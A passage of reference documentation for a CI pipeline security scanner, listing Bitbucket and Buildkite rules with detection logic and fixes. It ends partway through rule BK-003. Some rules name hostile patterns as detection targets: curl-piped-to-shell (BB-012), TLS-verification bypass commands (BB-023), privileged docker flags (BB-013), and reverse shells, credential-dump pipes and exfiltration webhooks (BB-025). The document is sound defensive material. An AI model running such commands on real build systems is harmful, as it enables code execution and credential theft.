### `BB-004`: Deploy step missing `deployment:` environment gate <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-004 }

**Evidences:** [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment, [`ESF-C-ENV-SEP`](#ctrl-esf-c-env-sep) Separate deployment environments (dev / staging / prod).

**How this is detected.** A step whose name or invoked pipe matches `deploy` / `release` / `publish` / `promote` should declare a `deployment:` field so Bitbucket enforces deployment-scoped variables, approvals, and history.

**Recommendation.** Add `deployment: production` (or `staging` / `test`) to the step. Configure the matching environment in the repo's Deployments settings with required reviewers and secured variables.

**Source:** [`BB-004`](../providers/bitbucket.md#bb-004) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-005`: Step has no `max-time`, unbounded build <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-005 }

**Evidences:** [`ESF-D-BUILD-TIMEOUT`](#ctrl-esf-d-build-timeout) Enforce bounded build execution (single-use, time-limited).

**How this is detected.** Without `max-time`, the step runs until Bitbucket's 120-minute global default kills it. Explicit per-step timeouts cap blast radius and cost.

**Recommendation.** Add `max-time: <minutes>` to each step, sized to the 95th percentile of historical runtime plus margin. Bounded runs limit the blast radius of a compromised build and prevent runaway minute consumption.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-005`](../providers/bitbucket.md#bb-005) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-006`: Artifacts not signed <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-006 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release.

**How this is detected.** Unsigned artifacts can't be verified downstream. Passes when cosign / sigstore / slsa-* / notation-sign appears in the pipeline body.

**Recommendation.** Add a step that runs `cosign sign` against the built image or archive, using Bitbucket OIDC for keyless signing where possible. Publish the signature next to the artifact and verify it at deploy time.

**Source:** [`BB-006`](../providers/bitbucket.md#bb-006) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-007`: SBOM not produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-007 }

**Evidences:** [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Without an SBOM, downstream consumers can't audit the dependency set shipped in the artifact. Passes when CycloneDX / syft / anchore / sbom-tool / Trivy-SBOM appears.

**Recommendation.** Add an SBOM step, `syft . -o cyclonedx-json`, Trivy with `--format cyclonedx`, or Microsoft's `sbom-tool`. Attach the SBOM as a build artifact.

**Source:** [`BB-007`](../providers/bitbucket.md#bb-007) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-008`: Credential-shaped literal in pipeline body <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-008 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Complements BB-003 (variable-name scan). BB-008 checks every string in the pipeline against the cross-provider credential-pattern catalog, catches secrets pasted into script bodies or environment blocks.

**Recommendation.** Rotate the exposed credential. Move the value to a Secured Repository or Deployment Variable and reference it by name.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Test fixtures and documentation blobs sometimes embed credential-shaped strings (JWT samples, AKIAI... examples). The AWS canonical example ``AKIAIOSFODNN7EXAMPLE`` is deliberately NOT suppressed, if it appears in a real pipeline it almost always means a copy-paste from docs was never substituted. Defaults to LOW confidence.

**Source:** [`BB-008`](../providers/bitbucket.md#bb-008) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-009`: pipe: pinned by version rather than sha256 digest <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-009 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests, [`ESF-S-IMMUTABLE`](#ctrl-esf-s-immutable) Enforce artifact / tag immutability to preserve provenance.

**How this is detected.** BB-001 fails floating tags at HIGH; BB-009 is the stricter tier. Even immutable-looking semver tags can be repointed by the registry; sha256 digests are tamper-evident.

**Recommendation.** Resolve each pipe to its digest (`docker buildx imagetools inspect bitbucketpipelines/<name>:<ver>`) and reference it via `@sha256:<digest>`.

**Source:** [`BB-009`](../providers/bitbucket.md#bb-009) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-010`: Deploy step ingests pull-request artifact unverified <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-010 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Bitbucket steps declare artifacts on the producer and downstream steps implicitly receive them. When an unprivileged step produces an artifact and a later `deployment:` step consumes it without verification, attacker-controlled output flows into the privileged stage.

**Recommendation.** Add a verification step before the deploy step consumes the artifact: `sha256sum -c artifact.sha256` against a manifest the producer signed, or `cosign verify` over the artifact directly. Alternatively, restrict the artifact-producing step to non-PR pipelines via ``branches:`` or ``custom:`` triggers.

**Source:** [`BB-010`](../providers/bitbucket.md#bb-010) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-011`: AWS auth uses long-lived access keys <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-011 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens.

**How this is detected.** Long-lived `AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY` values embedded in the pipeline file can't be rotated on a fine-grained schedule. Prefer OIDC or Bitbucket secured variables for cross-cloud access.

**Recommendation.** Use Bitbucket OIDC with `oidc: true` on the AWS pipe, or store credentials as secured Bitbucket variables rather than inline values. Remove static AWS_ACCESS_KEY_ID / AWS_SECRET_ACCESS_KEY from the pipeline file.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-011`](../providers/bitbucket.md#bb-011) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-012`: Remote script piped to shell interpreter <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-012 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects `curl | bash`, `wget | sh`, and similar patterns that pipe remote content directly into a shell interpreter inside a pipeline. An attacker who controls the remote endpoint (or poisons DNS / CDN) gains arbitrary code execution in the build runner.

**Recommendation.** Download the script to a file, verify its checksum, then execute it. Or vendor the script into the repository.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Established vendor installers (get.docker.com, sh.rustup.rs, bun.sh/install, awscli.amazonaws.com, cli.github.com, ...) ship via HTTPS from their own CDN and are idiomatic. This rule defaults to LOW confidence so CI gates can ignore them with --min-confidence MEDIUM; the finding still surfaces so teams that want cryptographic verification can audit.

**Source:** [`BB-012`](../providers/bitbucket.md#bb-012) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-013`: Docker run with insecure flags (privileged/host mount) <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-013 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** Flags like `--privileged`, `--cap-add`, `--net=host`, or host-root volume mounts (`-v /:/`) in a pipeline give the container full access to the build runner, enabling container escape and lateral movement.

**Recommendation.** Remove --privileged and --cap-add flags. Use minimal volume mounts. Prefer rootless containers.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-013`](../providers/bitbucket.md#bb-013) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-014`: Package install from insecure source <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-014 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects package-manager invocations that use plain HTTP registries (`--index-url http://`, `--registry=http://`) or disable TLS verification (`--trusted-host`, `--no-verify`) in a pipeline. These patterns allow man-in-the-middle injection of malicious packages.

**Recommendation.** Use HTTPS registry URLs. Remove --trusted-host and --no-verify flags. Pin to a private registry with TLS.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-014`](../providers/bitbucket.md#bb-014) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-015`: No vulnerability scanning step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-015 }

**Evidences:** [`ESF-S-VULN-MGMT`](#ctrl-esf-s-vuln-mgmt) Scan inbound artifacts (images, packages) for known vulnerabilities.

**How this is detected.** Without a vulnerability scanning step, known-vulnerable dependencies ship to production undetected. The check recognizes trivy, grype, snyk, npm audit, yarn audit, safety check, pip-audit, osv-scanner, and govulncheck.

**Recommendation.** Add a vulnerability scanning step, trivy, grype, snyk test, npm audit, pip-audit, or osv-scanner. Publish results so vulnerabilities surface before deployment.

**Source:** [`BB-015`](../providers/bitbucket.md#bb-015) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-016`: Self-hosted runner without ephemeral marker <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-016 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers), [`ESF-D-PRIV-BUILD`](#ctrl-esf-d-priv-build) Avoid privileged / host-networked build workers.

**How this is detected.** Self-hosted runners that persist between jobs leak filesystem and process state. A PR-triggered step writes to a well-known path; a subsequent deploy step on the same runner reads it. Detects `runs-on: self.hosted` without an `ephemeral` marker or Docker image override.

**Recommendation.** Use Docker-based self-hosted runners or configure runners to tear down between jobs. Add 'ephemeral' to `runs-on` labels or use Bitbucket's runner images that are rebuilt per-job.

**Source:** [`BB-016`](../providers/bitbucket.md#bb-016) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-017`: Repository token written to persistent storage <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-017 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Detects patterns where Bitbucket pipeline tokens are redirected to files or piped through `tee`. Persisted tokens survive the step boundary and can be exfiltrated by later steps, artifacts, or cache entries.

**Recommendation.** Never write BITBUCKET_TOKEN or REPOSITORY_OAUTH_ACCESS_TOKEN to files or artifacts. Use the token inline in the command that needs it and let Bitbucket revoke it after the build.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-017`](../providers/bitbucket.md#bb-017) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-018`: Cache key derives from attacker-controllable input <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-018 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Bitbucket caches are restored by key. When the key includes a value the attacker controls (branch name, tag, PR ID), a pull-request pipeline can plant a poisoned cache entry that a subsequent default-branch build restores.

**Recommendation.** Build the cache key from values the attacker cannot control. Prefer `hashFiles()` on lockfiles enforced by branch protection. Never include $BITBUCKET_BRANCH or PR-related variables in the cache key.

**Source:** [`BB-018`](../providers/bitbucket.md#bb-018) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-019`: after-script references secrets <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-019 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Bitbucket's `after-script` runs unconditionally after the main `script` block (including on failure). If the `after-script` references secrets or tokens, those values may leak into build logs or artifacts even when the step fails unexpectedly. This check detects secret-like variable references in `after-script` blocks.

**Recommendation.** Move secret-dependent operations into the main `script:` block. `after-script` runs even when the step fails and executes in a separate shell context, credential exposure here is harder to audit and more likely to persist in logs.

**Known false positives.**

- The detector matches any variable whose name contains ``TOKEN`` / ``SECRET`` / ``PASSWORD`` / ``KEY`` (case-insensitive). Names that are descriptive rather than secret (``CACHE_KEY``, ``SORT_KEY``, ``TOKEN_TYPE`` used as a label, ``API_KEY_NAME`` storing the *name* of the key rather than its value) trigger the regex even though they aren't credentials. The rule has no way to tell from the name alone, suppress per-step via ``--ignore-file`` when the referenced value is benign.

**Source:** [`BB-019`](../providers/bitbucket.md#bb-019) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-020`: Full clone depth exposes complete history <span class="pg-sev pg-sev--low">LOW</span> { #detail-bb-020 }

**Evidences:** [`ESF-D-BUILD-ENV`](#ctrl-esf-d-build-env) Harden the build environment (isolated, minimal, ephemeral workers).

**How this is detected.** By default Bitbucket Pipelines clone with `depth: 50`. Setting `depth: full` exposes the entire commit history, including any secrets that were committed and later removed. This check flags explicit `clone: depth: full` settings.

**Recommendation.** Set `clone: depth: 1` (or a small number) in pipeline or step options to limit the amount of repository history available in the build environment. Full clones make it easier to extract secrets that were committed and later removed.

**Source:** [`BB-020`](../providers/bitbucket.md#bb-020) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-021`: Package install without lockfile enforcement <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-021 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects package-manager install commands that do not enforce a lockfile or hash verification. Without lockfile enforcement the resolver pulls whatever version is currently latest, exactly the window a supply-chain attacker exploits.

**Recommendation.** Use lockfile-enforcing install commands: `npm ci` instead of `npm install`, `pip install --require-hashes -r requirements.txt`, `yarn install --frozen-lockfile`, `bundle install --frozen`, and `go install tool@v1.2.3`.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-021`](../providers/bitbucket.md#bb-021) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-022`: Dependency update command bypasses lockfile pins <span class="pg-sev pg-sev--medium">MEDIUM</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-022 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Detects `pip install --upgrade`, `npm update`, `yarn upgrade`, `bundle update`, `cargo update`, `go get -u`, and `composer update`. These commands bypass lockfile pins and pull whatever version is currently latest. Tooling upgrades (`pip install --upgrade pip`) are exempted.

**Recommendation.** Remove dependency-update commands from CI. Use lockfile-pinned install commands (`npm ci`, `pip install -r requirements.txt`) and update dependencies via a dedicated PR pipeline (e.g. Dependabot, Renovate).

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Common build-tool bootstrapping idioms (``pip install --upgrade pip``, ``pip install --upgrade setuptools wheel virtualenv``) and security-tool installs (``pip install --upgrade pip-audit / cyclonedx-bom / semgrep``) are exempted by the ``DEP_UPDATE_RE`` tooling allowlist. Other tooling-upgrade idioms not yet on the list can still trip the rule. Defaults to MEDIUM confidence so CI gates can require ``--min-confidence HIGH`` to ignore.

**Source:** [`BB-022`](../providers/bitbucket.md#bb-022) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-023`: TLS / certificate verification bypass <span class="pg-sev pg-sev--high">HIGH</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bb-023 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Detects patterns that disable TLS certificate verification: `git config http.sslVerify false`, `NODE_TLS_REJECT_UNAUTHORIZED=0`, `npm config set strict-ssl false`, `curl -k`, `wget --no-check-certificate`, `PYTHONHTTPSVERIFY=0`, and `GOINSECURE=`. Disabling TLS verification allows MITM injection of malicious packages, repositories, or build tools.

**Recommendation.** Remove TLS verification bypasses. Fix certificate issues at the source (install CA certificates, configure proper trust stores) instead of disabling verification.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Source:** [`BB-023`](../providers/bitbucket.md#bb-023) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-024`: No SLSA provenance attestation produced <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-024 }

**Evidences:** [`ESF-D-SIGN-ARTIFACTS`](#ctrl-esf-d-sign-artifacts) Sign build artifacts and verify signatures before release, [`ESF-D-SBOM`](#ctrl-esf-d-sbom) Produce SBOM / provenance metadata with every build.

**How this is detected.** Bitbucket has no native SLSA builder; self-hosted attestation via ``cosign attest`` or ``witness run`` is the usual path. Pipes like ``atlassian/cosign-attest`` (if published) would also match.

**Recommendation.** Add a step that runs ``cosign attest`` against a ``provenance.intoto.jsonl`` statement, or integrate the TestifySec ``witness run`` attestor. Artifact signing alone (BB-006) doesn't satisfy SLSA Build L3.

**Source:** [`BB-024`](../providers/bitbucket.md#bb-024) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-025`: Pipeline contains indicators of malicious activity <span class="pg-sev pg-sev--critical">CRITICAL</span> { #detail-bb-025 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context, [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Specific indicators only (reverse shells, base64-decoded execution, miner binaries, Discord/Telegram webhooks, credential-dump pipes, audit-erasure commands). Does not replace BB-014 (TLS bypass) or BB-013 (Docker insecure), those are hygiene; this is evidence.

**Recommendation.** Treat as a potential compromise. Identify the PR that added the matching step(s), rotate any credentials referenced from the pipeline's variable groups, and audit recent builds.

**Known false positives.**

- Security-training repositories, CTF challenges, and red-team exercise pipelines legitimately contain reverse-shell strings or exfil domains as literals. Matches inside YAML keys / HCL attributes whose names contain ``example``, ``fixture``, ``sample``, ``demo``, or ``test`` are auto-suppressed; bare lines in a production pipeline still fire.
- Defaults to LOW confidence. Filter with ``--min-confidence MEDIUM`` to ignore all matches; the rule still surfaces the hit for teams that want to spot-check.

**Source:** [`BB-025`](../providers/bitbucket.md#bb-025) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-026`: Dangerous shell idiom (eval, sh -c variable, backtick exec) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-026 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Complements BB-002 (script injection from untrusted PR context). This rule fires on intrinsically risky idioms, ``eval``, ``sh -c "$X"``, backtick exec, regardless of whether the input source is currently trusted.

**Recommendation.** Replace ``eval "$VAR"`` / ``sh -c "$VAR"`` / backtick exec with direct command invocation. Validate or allow-list any value that must feed a dynamic command at the boundary.

**Known false positives.**

- ``eval "$(ssh-agent -s)"`` and similar ``eval "$(<literal-tool>)"`` bootstrap idioms are intentionally NOT flagged, the substituted command is literal, only its output is eval'd.

**Source:** [`BB-026`](../providers/bitbucket.md#bb-026) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-027`: Package install bypasses registry integrity (git / path / tarball source) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-027 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Complements BB-021 (missing lockfile flag). Git URL installs without a commit pin, local-path installs, and direct tarball URLs bypass the registry integrity controls the lockfile relies on.

**Recommendation.** Pin git dependencies to a commit SHA. Publish private packages to an internal registry instead of installing from a filesystem path or tarball URL.

**Source:** [`BB-027`](../providers/bitbucket.md#bb-027) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-028`: OIDC step without deployment-gated environment <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-028 }

**Evidences:** [`ESF-D-TOKEN-HYGIENE`](#ctrl-esf-d-token-hygiene) Use short-lived, federated credentials (OIDC), not long-lived tokens, [`ESF-C-APPROVAL`](#ctrl-esf-c-approval) Require explicit approval before production deployment.

**How this is detected.** Pairs with IAM-008. IAM-008 verifies the cloud-side trust policy pins audience + subject; this rule verifies the Bitbucket-side workflow can't request a token without a deployment gate. Bitbucket's ``pull-requests:`` triggers from forks so OIDC under that branch is always an unbounded blast radius.

**Recommendation.** Every step that sets ``oidc: true`` must also declare a ``deployment:`` (production / staging / test). Bitbucket deployments enforce manual approvals, restricted variables, and audit logs that an ungated step bypasses. Steps reached through ``pull-requests:`` should never request OIDC tokens, any forked PR can drive the role assumption.

**Source:** [`BB-028`](../providers/bitbucket.md#bb-028) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-029`: image: (step or service) not pinned by sha256 digest <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bb-029 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use, [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** BB-001 / BB-009 only inspect ``pipe:`` references inside ``script:`` lists. Step ``image:`` directives and ``definitions.services.<name>.image:`` define the runtime container the build executes inside (and the auxiliary containers the step talks to over the loopback network). Both surfaces ship code into the build context, a compromised service image (the postgres container, the selenium-grid container, …) can exfiltrate every secret the step touches just as easily as the step image itself. This rule reuses ``_primitives.image_pinning.classify`` so the floating-tag semantics match GHA-001 / GL-001 / JF-009 / ADO-009 / CC-003 / K8S-001.

**Recommendation.** Resolve every ``image:`` reference to its current digest (``docker buildx imagetools inspect <ref>`` or ``crane digest <ref>``) and pin via ``image: name@sha256:<digest>``. Floating tags (``:latest``, ``:3``, no tag) silently swap the runtime image, the build's reproducibility invariant is broken and a registry-side compromise lands inside CI without any local change.

**Known false positives.**

- Bitbucket-vendored helper images (``atlassian/`` namespace) are still treated as third-party, the registry can move the tag. Pin them too rather than suppressing the rule globally.

**Source:** [`BB-029`](../providers/bitbucket.md#bb-029) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-030`: npm install without registry-signature verification step <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-030 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per ``bitbucket-pipelines.yml`` when:

1. Some step's ``script:`` runs an npm or pnpm install verb (``npm ci``, ``npm install``, ``npm i``, ``pnpm install``, ``pnpm i``, ``pnpm ci``);
2. No step anywhere in the file runs ``npm audit signatures`` or ``pnpm audit signatures``.

Yarn / Bun-only pipelines pass silently because the ``audit signatures`` primitive is npm-CLI-specific (Yarn Berry's ``yarn npm audit`` does not yet verify registry trusted-publisher records). Pairs with the per-package lockfile rules NPM-002 / NPM-006.

**Recommendation.** Add an ``npm audit signatures`` step (or ``pnpm audit signatures``) after the install. Lockfile pinning only guarantees the bytes installed match the lockfile; ``audit signatures`` is what verifies those bytes were signed by the registry's trusted publisher for the package. Run it as a separate script line after ``npm ci`` and before any code from ``node_modules/`` executes.

**Known false positives.**

- Pipelines that build against a private registry without trusted-publisher records (legacy Artifactory, self-hosted Verdaccio without sigstore) cannot run ``audit signatures`` meaningfully. Suppress on the specific pipeline with a rationale that names the private registry.

**Seen in the wild.**

- Shai-Hulud npm worm (2026) / TanStack / axios patch-release compromises rode the gap between lockfile-pinned integrity and registry-signed-publisher provenance.

**Source:** [`BB-030`](../providers/bitbucket.md#bb-030) in the [Bitbucket provider](../providers/bitbucket.md).

### `BB-031`: pip install without `--require-hashes` verification <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-bb-031 }

**Evidences:** [`ESF-S-VERIFY-DEPS`](#ctrl-esf-s-verify-deps) Verify third-party and open-source dependencies before use.

**How this is detected.** Fires once per ``bitbucket-pipelines.yml`` when some step's ``script:`` runs a real ``pip install`` (excluding the tooling-bootstrap allowlist) AND no step in the file uses ``--require-hashes`` or a hash-pinning manager (``uv sync`` / ``poetry install`` / ``pipenv install --deploy``).

**Recommendation.** Pin every dependency with a SHA-256 hash and install with ``pip install -r requirements.txt --require-hashes``, or migrate to a manager that hash-pins by default: ``uv sync``, ``poetry install``, ``pipenv install --deploy``. Hash-pinned install is the PyPI equivalent of npm's lockfile-integrity guarantee.

**Known false positives.**

- Pipelines that build against a private index without SHA-256 hash records cannot run ``--require-hashes`` meaningfully. Suppress with a rationale that names the private index.

**Seen in the wild.**

- PyPI maintainer-account compromises (ctx 2022, requests-darwin-lite 2024) shipped malicious sdists / wheels under existing version pins.

**Source:** [`BB-031`](../providers/bitbucket.md#bb-031) in the [Bitbucket provider](../providers/bitbucket.md).

### `BK-001`: Buildkite plugin not pinned to an exact version <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-001 }

**Evidences:** [`ESF-S-PIN-DEPS`](#ctrl-esf-s-pin-deps) Pin dependencies / actions / images to immutable digests.

**How this is detected.** Buildkite resolves plugin refs at agent boot. ``foo#v1.2.3`` locks the version; ``foo#main`` / ``foo`` does not. Detection fires on bare names, branch keywords, and partial-semver pins (``v4``, ``v4.13``).

**Recommendation.** Pin every plugin reference to an exact tag (``docker-compose#v4.13.0``) or a 40-char commit SHA. Bare references (``docker-compose``), branch refs (``#main`` / ``#master``), and major-only floats (``#v4``) resolve to whatever is current at agent start time, which lets a compromised plugin release execute inside the pipeline.

**Source:** [`BK-001`](../providers/buildkite.md#bk-001) in the [Buildkite provider](../providers/buildkite.md).

### `BK-002`: Literal secret value in pipeline env block <span class="pg-sev pg-sev--critical">CRITICAL</span> <span class="pg-fix" title="`--fix` will patch this rule">🔧 fix</span> { #detail-bk-002 }

**Evidences:** [`ESF-D-SECRETS`](#ctrl-esf-d-secrets) Protect secrets used during build; no secrets in source or env.

**How this is detected.** Detection fires on values that look like AWS access keys, GitHub PATs, OpenAI keys, JWTs, or generic high-entropy tokens, plus on env-var names that imply a secret (``*_TOKEN``, ``*_KEY``, ``*PASSWORD``, ``*SECRET``) when the value is a non-empty literal rather than an interpolation (``$SECRET_FROM_AGENT_HOOK``).

**Recommendation.** Move the value out of the pipeline file. Use Buildkite's agent secrets hooks (``secrets/`` directory or ``BUILDKITE_PLUGIN_AWS_SSM_*``), the ``aws-ssm`` / ``vault-secrets`` plugins, or the ``BUILDKITE_PIPELINE_DEFAULT_BRANCH`` env var pulled from a secret manager. The pipeline.yml is committed to the repo and visible to anyone with read access.

**Autofix.** `pipeline_check --fix` will patch this finding automatically. Review the diff before committing; the fixer applies the conservative remediation pattern (e.g. swap a floating tag for the digest it currently resolves to), not the most aggressive one.

**Known false positives.**

- Names that imply a secret but actually store a non-sensitive identifier flag here: ``CACHE_KEY: build-2024-Q4``, ``API_KEY_PATH: /var/run/secrets/api``, ``SECRET_NAME: my-vault-secret``. The rule has no way to tell from the name + literal alone whether the value is the credential or merely a reference to one. Also: deliberate test fixtures and documentation snippets that embed canonical example values (``AKIAIOSFODNN7EXAMPLE``) match the strong-pattern set; this is intentional, real-world copies of those example literals usually mean a docs paste was never substituted.

**Source:** [`BK-002`](../providers/buildkite.md#bk-002) in the [Buildkite provider](../providers/buildkite.md).

### `BK-003`: Untrusted Buildkite variable interpolated in command <span class="pg-sev pg-sev--high">HIGH</span> { #detail-bk-003 }

**Evidences:** [`ESF-D-INJECTION`](#ctrl-esf-d-injection) Prevent script / template injection from untrusted pipeline context.

**How this is detected.** Buildkite passes branch / tag / message metadata as environment variables. Putting them inside ``$(...)`` or shelling out with the value unquoted is a classic command-injection vector. The detection fires on the unquoted interpolation form and on use inside ``eval`` / ``$(...)``.

